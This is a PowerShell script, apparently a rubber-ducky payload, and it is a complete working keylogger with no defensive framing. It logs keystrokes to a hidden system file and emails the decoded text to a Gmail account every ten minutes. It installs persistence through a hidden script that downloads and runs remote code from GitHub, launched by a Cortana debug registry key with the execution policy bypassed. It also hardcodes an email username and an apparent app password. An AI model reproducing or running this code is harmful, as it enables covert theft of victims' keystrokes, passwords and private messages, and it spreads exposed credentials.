[CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
    [Parameter(Position = 0, Mandatory = $False, Parametersetname="username")]
    [String]
    $username = "null",

    [Parameter(Position = 1, Mandatory = $False, Parametersetname="password")]
    [String]
    $password = "null"
)
    
$functions =  {

    function script:Klog
    {
        $signature = @" 
        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
        public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@ 
        
        $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
        $filename = "$env:windir\key.log"
        fsutil file createnew $filename 0
        (Get-ChildItem $filename).Attributes = "Hidden","System"
        while ($true) 
        { 
            Start-Sleep -Milliseconds 40 
            $logged = "" 
            $result="" 
            $shift_state="" 
            $caps_state="" 
            for ($char=1;$char -le 254;$char++) 
            { 
                $vkey = $char 
                $logged = $getKeyState::GetAsyncKeyState($vkey) 
                if ($logged -eq -32767) 
                { 
                    if(($vkey -ge 48) -and ($vkey -le 57)) 
                    { 
                        $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                        $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                            if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                            { 
                                $result = "S-" + $vkey 
                            } 
                            else 
                            { 
                                $result = $vkey 
                            } 
                        } 
                    elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                    { 
                        $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                        $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        $caps_state = [console]::CapsLock 
                        if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                    elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                    { 
                        $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                        $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey
                        } 
                        else 
                        { 
                          $result = $vkey
                        } 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    }
                    $now = Get-Date
                    $logLine = "$result "
                    Out-File -FilePath $filename -Append -InputObject "$logLine"
                }
            }
        }
    }

    function Kpaste
    {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $username,

            [Parameter(Position = 1, Mandatory = $True)]
            [String]
            $password
        )
        
        $filename = "$env:windir\key.log"
        while($true) 
        { 
            Start-Sleep -Seconds 600
            
            $data = Get-Content $filename
            Remove-Item -path $filename -Force
            $keys = $data.split("   ");
            $out = ""
            foreach ($i in $keys)
            {
                switch ($i)
                {
                    48 {$out = $out + "0"}
                    49 {$out = $out + "1"}
                    50 {$out = $out + "2"}
                    51 {$out = $out + "3"}
                    52 {$out = $out + "4"}
                    53 {$out = $out + "5"}
                    54 {$out = $out + "6"}
                    55 {$out = $out + "7"}
                    56 {$out = $out + "8"}
                    57 {$out = $out + "9"}
                    S-48 {$out = $out + ")"}
                    S-49 {$out = $out + "!"}
                    S-50 {$out = $out + "@"}
                    S-51 {$out = $out + "#"}
                    S-52 {$out = $out + "$"}
                    S-53 {$out = $out + "%"}
                    S-54 {$out = $out + "^"}
                    S-55 {$out = $out + "&"}
                    S-56 {$out = $out + "*"}
                    S-57 {$out = $out + "("}
                    65 {$out = $out + "A"}
                    66 {$out = $out + "B"}
                    67 {$out = $out + "C"}
                    68 {$out = $out + "D"}
                    69 {$out = $out + "E"}
                    70 {$out = $out + "F"}
                    71 {$out = $out + "G"}
                    72 {$out = $out + "H"}
                    73 {$out = $out + "I"}
                    74 {$out = $out + "J"}
                    75 {$out = $out + "K"}
                    76 {$out = $out + "L"}
                    77 {$out = $out + "M"}
                    78 {$out = $out + "N"}
                    79 {$out = $out + "O"}
                    80 {$out = $out + "P"}
                    81 {$out = $out + "Q"}
                    82 {$out = $out + "R"}
                    83 {$out = $out + "S"}
                    84 {$out = $out + "T"}
                    85 {$out = $out + "U"}
                    86 {$out = $out + "V"}
                    87 {$out = $out + "W"}
                    88 {$out = $out + "X"}
                    89 {$out = $out + "Y"}
                    90 {$out = $out + "Z"}
                    S-65 {$out = $out + "a"}
                    S-66 {$out = $out + "b"}
                    S-67 {$out = $out + "c"}
                    S-68 {$out = $out + "d"}
                    S-69 {$out = $out + "e"}
                    S-70 {$out = $out + "f"}
                    S-71 {$out = $out + "g"}
                    S-72 {$out = $out + "h"}
                    S-73 {$out = $out + "i"}
                    S-74 {$out = $out + "j"}
                    S-75 {$out = $out + "k"}
                    S-76 {$out = $out + "l"}
                    S-77 {$out = $out + "m"}
                    S-78 {$out = $out + "n"}
                    S-79 {$out = $out + "o"}
                    S-80 {$out = $out + "p"}
                    S-81 {$out = $out + "q"}
                    S-82 {$out = $out + "r"}
                    S-83 {$out = $out + "s"}
                    S-84 {$out = $out + "t"}
                    S-85 {$out = $out + "u"}
                    S-86 {$out = $out + "v"}
                    S-87 {$out = $out + "w"}
                    S-88 {$out = $out + "x"}
                    S-89 {$out = $out + "y"}
                    S-90 {$out = $out + "z"}
                    96 {$out = $out + "0"}
                    97 {$out = $out + "1"}
                    98 {$out = $out + "2"}
                    99 {$out = $out + "3"}
                    100 {$out = $out + "4"}
                    101 {$out = $out + "5"}
                    102 {$out = $out + "6"}
                    103 {$out = $out + "7"}
                    104 {$out = $out + "8"}
                    105 {$out = $out + "9"}
                    186 {$out = $out + ";"}
                    187 {$out = $out + "="}
                    188 {$out = $out + ","}
                    189 {$out = $out + "-"}
                    190 {$out = $out + "."}
                    191 {$out = $out + "/"}
                    192 {$out = $out + "``"}
                    S-186 {$out = $out + ":"}
                    S-187 {$out = $out + "+"}
                    S-188 {$out = $out + "<"}
                    S-189 {$out = $out + "_  "}
                    S-190 {$out = $out + ">"}
                    S-191 {$out = $out + "?"}
                    S-192 {$out = $out + "~"}
                    46 {$out = $out + "Delete"}
                    8 {$out = $out + "Backspace"}
                    32 {$out = $out + " "}
                    13 {$out = $out + "\n"}
                }
            }
            
            $pastevalue=$out
            
            $now = Get-Date
            $name = $env:COMPUTERNAME 
            $pastename = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
            
            if ($pastevalue)
            {
                $smtpserver = "smtp.gmail.com"
                $msg = new-object Net.Mail.MailMessage
                $smtp = new-object Net.Mail.SmtpClient($smtpServer, 587)
                $smtp.EnableSsl = $True
                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                $msg.From = "$username@gmail.com"
                $msg.To.Add("$username@gmail.com")
                $msg.Subject = $pastename
                $msg.Body = $pastevalue
                $smtp.Send($msg)

                $filename = "$env:windir\key.log"
                rm -force $filename
                fsutil file createnew $filename 0
                (Get-ChildItem $filename).Attributes = "Hidden","System"
            }
        }
    }
    
    function Mpers
    {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $username,

            [Parameter(Position = 1, Mandatory = $True)]
            [String]
            $password
        )
        
        while($true)
        {
            $modulename = "a.ps1"
            $modulenamepath = "$env:windir\$modulename"
            
            if(-Not ([System.IO.File]::Exists($modulenamepath)))
            {
                Out-File -InputObject 'do { $ping = test-connection -comp google.com -count 1 -Quiet; Start-Sleep -Seconds 10 } until ($ping)' -Force $env:windir\$modulename
                Out-File -InputObject '$username = "ryouichi.mikami.hirata"' -Append -NoClobber $env:windir\$modulename
                Out-File -InputObject '$password = "toryfuhbtedjzxig"' -Append -NoClobber $env:windir\$modulename
                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Append -NoClobber $env:windir\$modulename
                Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:windir\$modulename
                $modulenamefile = Get-Item $env:windir\$modulename
                $modulenamefile.Attributes = "Hidden","System"
            }
            
            $cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
            New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:windir\$modulename" -force
            
            Start-Sleep -Seconds 5
        }
    }
}

start-job -InitializationScript $functions -scriptblock {Kpaste $args[0] $args[1]} -ArgumentList @($username,$password)
start-job -InitializationScript $functions -scriptblock {Klog}
start-job -InitializationScript $functions -scriptblock {Mpers $args[0] $args[1]} -ArgumentList @($username,$password)
